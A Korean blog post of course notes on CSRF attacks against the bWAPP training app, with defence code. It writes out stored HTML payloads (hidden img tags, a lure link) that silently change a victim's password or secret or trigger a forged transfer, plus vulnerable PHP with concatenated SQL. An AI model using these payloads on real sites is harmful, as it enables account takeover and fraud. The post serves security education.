---
layout: post
title: "비박스를 활용한 웹 모의해킹 완벽 실습 - 비밀번호 변경/비밀번호 힌트 변경/계좌 이체"
excerpt_separator:  <!--more-->
categories:
 - WebHack
tags:
  - 웹 해킹
  - 인프런
  - Part8 A8
  - 크로스 사이트 요청 변조
---

<!--more-->

# 출처

## 인프런, 비박스를 활용한 웹 모의해킹 완벽 실습 23강 <https://www.inflearn.com/course/%EB%B9%84%EB%B0%95%EC%8A%A4-%EB%AA%A8%EC%9D%98%ED%95%B4%ED%82%B9-%EC%8B%A4%EC%8A%B5/>

---

## 크로스 사이트 요청 변조(CSRF, Cross-site Request Forgery)

* 공격자에 의해 사용자가 의도하지 않은 악의적인 행위를 서버에 요청
* 공격자가 입력한 악의적인 스크립트 코드에 접근
* 사용자의 웹 브라우저 웹 서버에 악의적인 요청
* 웹 서버는 변조된 요청에 응답
* 사용자가 공격의 매개물로 공격자를 대신하여 악의적인 요청 전송

![image](https://user-images.githubusercontent.com/28076542/53412963-2a96f480-3a0e-11e9-94ff-18979c5f237a.png)

## CSRF (Change Password)

![image](https://user-images.githubusercontent.com/28076542/53413259-e0fad980-3a0e-11e9-9798-7c10dfeed83f.png)

* New password: apple
* 위와 같이 설정하고 BurpSuite 프록시 잡기

### 1. BurpSuite 프록시에서 Copy URL

![image](https://user-images.githubusercontent.com/28076542/53413430-4f3f9c00-3a0f-11e9-8e76-a017da397f49.png)

* URL: `https://192.168.190.143:8443/bWAPP/csrf_1.php?password_new=apple&password_conf=apple&action=change` 프록시는 off 시키기
* 8443은 이전에 공부한 것 때문에 따라온 포트인데 있으나 없으나 상관없음

### 2. HTML Injection - Stored (Blog)에 HTML 코드 삽입(img)

```html
<img src = "https://192.168.190.143:8443/bWAPP/csrf_1.php?password_new=apple&password_conf=apple&action=change" height=0 width=0>
```

![image](https://user-images.githubusercontent.com/28076542/53413788-51eec100-3a10-11e9-84aa-14a6e5d8e2b8.png)

* 아무것도 안 보여도 접속이 되었으며 실제 비밀번호도 바뀜

### 3. HTML Injection - Stored (Blog)에 HTML 코드 삽입(a href)

```html
<a href = "https://192.168.190.143:8443/bWAPP/csrf_1.php?password_new=apple&password_conf=apple&action=change">download</a>
```

![image](https://user-images.githubusercontent.com/28076542/53413988-f40ea900-3a10-11e9-9613-9c78d801592a.png)

* 클릭을 유도하여 패스워드를 바꾸게 함

---

## CSRF (Change Secret)

![image](https://user-images.githubusercontent.com/28076542/53414268-a8a8ca80-3a11-11e9-8acf-de06d27073a9.png)

* New secret: abcd

### 1. BurpSuite 프록시에서 URL 가져오기

![image](https://user-images.githubusercontent.com/28076542/53414430-18b75080-3a12-11e9-81ae-7b4b268f4a45.png)

* URL: `https://192.168.190.143:8443/bWAPP/csrf_3.php?secret=abcd&login=bee&action=change`

### 2. HTML Injection - Stored (Blog)에 HTML 코드 삽입(img, 크기 지정 안 함)

```html
<img src="https://192.168.190.143:8443/bWAPP/csrf_3.php?secret=abcd&login=bee&action=change"
```

![image](https://user-images.githubusercontent.com/28076542/53414576-66cc5400-3a12-11e9-9ccb-fdf6793afeb8.png)

---

## 방어 방법

### CSRF (Change Password) (High) 방어

![image](https://user-images.githubusercontent.com/28076542/53414747-c4f93700-3a12-11e9-81fd-d861054b834e.png)

* Current Password를 입력하게끔 요구

#### csrf_1.php에서 취약 코드

```php
if($_COOKIE["security_level"] != "1" && $_COOKIE["security_level"] != "2") 
            {

                $sql = "UPDATE users SET password = '" . $password_new . "' WHERE login = '" . $login . "'";

                // Debugging
                // echo $sql;      

                $recordset = $link->query($sql);
```

#### csrf_1.php에서 방어 코드

```php
else
            {
                
                if(isset($_REQUEST["password_curr"]))
                {
                              
                    $password_curr = $_REQUEST["password_curr"];
                    $password_curr = mysqli_real_escape_string($link, $password_curr);
                    $password_curr = hash("sha1", $password_curr, false);                

                    $sql = "SELECT password FROM users WHERE login = '" . $login . "' AND password = '" . $password_curr . "'";

                    // Debugging
                    // echo $sql;    

                    $recordset = $link->query($sql);             

```

### CSRF (Change Secret) (High) 방어

* token을 확인함

#### csrf_3.php에서 취약 코드

```php
if($_COOKIE["security_level"] != "1" && $_COOKIE["security_level"] != "2") 
            {

                if(isset($_REQUEST["login"]) && $_REQUEST["login"])                    
                {

                    $login = $_REQUEST["login"];
                    $login = mysqli_real_escape_string($link, $login);
                    
                    $secret = mysqli_real_escape_string($link, $secret);
                    $secret = htmlspecialchars($secret, ENT_QUOTES, "UTF-8");

                    $sql = "UPDATE users SET secret = '" . $secret . "' WHERE login = '" . $login . "'";

```

#### csrf_3.php에서 방어 코드

```php
else
            {
                
                // If the security level is MEDIUM or HIGH
                if(!isset($_REQUEST["token"]) or !isset($_SESSION["token"]) or $_REQUEST["token"] != $_SESSION["token"])
                {

                    $message = "<font color=\"red\">Invalid token!</font>";            

                }
```

#### csrf_3.php에서 token을 가져오는 부분

```php
// A random token is generated when the security level is MEDIUM or HIGH
if($_COOKIE["security_level"] == "1" or $_COOKIE["security_level"] == "2")
{

    $token = sha1(uniqid(mt_rand(0,100000)));
    $_SESSION["token"] = $token;

}
```

* 이전 페이지에 접속하지 않은 사람은 토큰이 없으므로 패스워드 변경 불가

---

## CSRF (Transfer Amount)

![image](https://user-images.githubusercontent.com/28076542/53415139-c24b1180-3a13-11e9-8ab0-502c14a283fa.png)

* -100원을 넣고 보내면 URL이 다음과 같음
* URL: `https://192.168.190.143:8443/bWAPP/csrf_2.php?account=123-45678-90&amount=-100&action=transferr`

### HTML Injection - Stored (Blog)에 인젝션 코드 삽입

```html
<img src="https://192.168.190.143:8443/bWAPP/csrf_2.php?account=123-45678-90&amount=-100&action=transfer">
```

![image](https://user-images.githubusercontent.com/28076542/53415350-603edc00-3a14-11e9-9c5f-8efc693497a5.png)

* 삽입하고 잔액을 확인하면 오히려 돈이 늘어나게 됨

### csrf-2.php에서 방어하는 부분

```php
else

        if(isset($_GET["action"]) && isset($_GET["token"]) && isset($_SESSION["token"]))
        {    

            if(($_GET["token"] == $_SESSION["token"]) && ($_GET["action"]) == "transfer")
            {

                $_SESSION["amount"] = $_SESSION["amount"] - $_GET["amount"];

            }

        }

}

// A random token is generated when the security level is HIGH
if($_COOKIE["security_level"] == "2")
{

    $token = sha1(uniqid(mt_rand(0,100000)));
    $_SESSION["token"] = $token;

}
```